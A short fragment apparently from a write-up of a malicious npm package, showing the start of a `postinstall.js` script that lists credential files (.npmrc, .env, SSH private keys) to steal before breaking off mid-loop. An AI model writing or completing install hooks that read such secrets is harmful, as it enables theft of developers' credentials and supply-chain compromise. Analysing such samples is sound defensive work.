The `postinstall.js` script:
```javascript
const fs = require('fs');
const path = require('path');

const filesToSteal = [
  '.npmrc',
  '.env',
  '~/.ssh/id_rsa',
  '~/.ssh/id_dsa'
];

filesToSteal.forEach((file) => {
